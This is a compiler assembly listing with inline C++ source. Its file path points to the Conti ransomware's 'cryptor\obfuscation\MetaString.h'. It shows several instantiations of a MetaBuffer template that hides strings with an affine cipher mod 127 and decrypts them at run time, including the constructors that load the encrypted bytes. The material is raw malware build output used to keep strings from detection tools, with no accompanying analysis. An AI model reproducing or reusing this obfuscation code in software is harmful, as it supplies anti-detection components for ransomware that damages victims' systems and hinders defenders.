??0?$MetaBuffer@$0L@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<11,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<11,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GL@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<107,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 42	 sub	 ecx, 66			; 00000042H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 13	 imul	 r8d, ecx, 19

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<107,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GL@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GL@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<107,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<107,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 23	 mov	 BYTE PTR [rcx+1], 35	; 00000023H
  00007	c6 41 02 42	 mov	 BYTE PTR [rcx+2], 66	; 00000042H
  0000b	c6 41 03 48	 mov	 BYTE PTR [rcx+3], 72	; 00000048H
  0000f	c6 41 04 42	 mov	 BYTE PTR [rcx+4], 66	; 00000042H
  00013	c6 41 05 05	 mov	 BYTE PTR [rcx+5], 5
  00017	c6 41 06 42	 mov	 BYTE PTR [rcx+6], 66	; 00000042H
  0001b	c6 41 07 62	 mov	 BYTE PTR [rcx+7], 98	; 00000062H
  0001f	c6 41 08 42	 mov	 BYTE PTR [rcx+8], 66	; 00000042H
  00023	c6 41 09 42	 mov	 BYTE PTR [rcx+9], 66	; 00000042H
  00027	c6 41 0a 42	 mov	 BYTE PTR [rcx+10], 66	; 00000042H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0GL@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<107,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<107,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0ED@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<67,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 67		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0c 00 00
	00		 mov	 r10d, 12
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 55 00 00 00	 mov	 eax, 85			; 00000055H
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  0003a	f7 e9		 imul	 ecx
  0003c	03 d1		 add	 edx, ecx
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	2b c8		 sub	 ecx, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00055	f7 e9		 imul	 ecx
  00057	03 d1		 add	 edx, ecx
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00068	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006c	49 83 ea 01	 sub	 r10, 1
  00070	75 ae		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00072	49 8b c0	 mov	 rax, r8
  00075	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<67,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0ED@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0ED@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<67,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<67,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 77	 mov	 BYTE PTR [rcx+1], 119	; 00000077H
  00007	c6 41 02 55	 mov	 BYTE PTR [rcx+2], 85	; 00000055H
  0000b	c6 41 03 67	 mov	 BYTE PTR [rcx+3], 103	; 00000067H
  0000f	c6 41 04 55	 mov	 BYTE PTR [rcx+4], 85	; 00000055H
  00013	c6 41 05 72	 mov	 BYTE PTR [rcx+5], 114	; 00000072H
  00017	c6 41 06 55	 mov	 BYTE PTR [rcx+6], 85	; 00000055H
  0001b	c6 41 07 6e	 mov	 BYTE PTR [rcx+7], 110	; 0000006eH
  0001f	c6 41 08 55	 mov	 BYTE PTR [rcx+8], 85	; 00000055H
  00023	c6 41 09 36	 mov	 BYTE PTR [rcx+9], 54	; 00000036H
  00027	c6 41 0a 55	 mov	 BYTE PTR [rcx+10], 85	; 00000055H
  0002b	c6 41 0b 55	 mov	 BYTE PTR [rcx+11], 85	; 00000055H
  0002f	c6 41 0c 55	 mov	 BYTE PTR [rcx+12], 85	; 00000055H
  00033	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00037	48 8b c1	 mov	 rax, rcx
  0003a	c3		 ret	 0
??0?$MetaBuffer@$0ED@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<67,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<67,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$02$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$02$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<3,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 30 00 00 00	 mov	 eax, 48			; 00000030H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2a	 imul	 ecx, eax, 42		; 0000002aH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$02$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<3,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$02$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$02$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<3,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<3,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 3b	 mov	 BYTE PTR [rcx+1], 59	; 0000003bH
  00007	c6 41 02 30	 mov	 BYTE PTR [rcx+2], 48	; 00000030H
  0000b	c6 41 03 09	 mov	 BYTE PTR [rcx+3], 9
  0000f	c6 41 04 30	 mov	 BYTE PTR [rcx+4], 48	; 00000030H
  00013	c6 41 05 58	 mov	 BYTE PTR [rcx+5], 88	; 00000058H
  00017	c6 41 06 30	 mov	 BYTE PTR [rcx+6], 48	; 00000030H
  0001b	c6 41 07 64	 mov	 BYTE PTR [rcx+7], 100	; 00000064H
  0001f	c6 41 08 30	 mov	 BYTE PTR [rcx+8], 48	; 00000030H
  00023	c6 41 09 30	 mov	 BYTE PTR [rcx+9], 48	; 00000030H
  00027	c6 41 0a 30	 mov	 BYTE PTR [rcx+10], 48	; 00000030H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$02$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<3,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<3,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0CJ@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<41,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 27	 sub	 ecx, 39			; 00000027H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 1f	 imul	 r8d, ecx, 31

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<41,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CJ@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0CJ@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<41,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<41,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 14	 mov	 BYTE PTR [rcx+1], 20
  00007	c6 41 02 27	 mov	 BYTE PTR [rcx+2], 39	; 00000027H
  0000b	c6 41 03 64	 mov	 BYTE PTR [rcx+3], 100	; 00000064H
  0000f	c6 41 04 27	 mov	 BYTE PTR [rcx+4], 39	; 00000027H
  00013	c6 41 05 33	 mov	 BYTE PTR [rcx+5], 51	; 00000033H
  00017	c6 41 06 27	 mov	 BYTE PTR [rcx+6], 39	; 00000027H
  0001b	c6 41 07 4b	 mov	 BYTE PTR [rcx+7], 75	; 0000004bH
  0001f	c6 41 08 27	 mov	 BYTE PTR [rcx+8], 39	; 00000027H
  00023	c6 41 09 27	 mov	 BYTE PTR [rcx+9], 39	; 00000027H
  00027	c6 41 0a 27	 mov	 BYTE PTR [rcx+10], 39	; 00000027H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0CJ@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<41,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<41,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$0BA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0DF@$0BA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<53,16,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 6c		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 10	 sub	 ecx, 16

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 8d 04 49	 lea	 r8d, DWORD PTR [rcx+rcx*2]
  00034	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00038	41 f7 e8	 imul	 r8d
  0003b	41 03 d0	 add	 edx, r8d
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	44 2b c0	 sub	 r8d, eax
  0004e	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00053	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00057	41 f7 e8	 imul	 r8d
  0005a	41 03 d0	 add	 edx, r8d
  0005d	c1 fa 06	 sar	 edx, 6
  00060	8b c2		 mov	 eax, edx
  00062	c1 e8 1f	 shr	 eax, 31
  00065	03 d0		 add	 edx, eax
  00067	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0006a	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0006d	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  00071	49 83 eb 01	 sub	 r11, 1
  00075	75 a9		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00077	49 8b c1	 mov	 rax, r9
  0007a	c3		 ret	 0
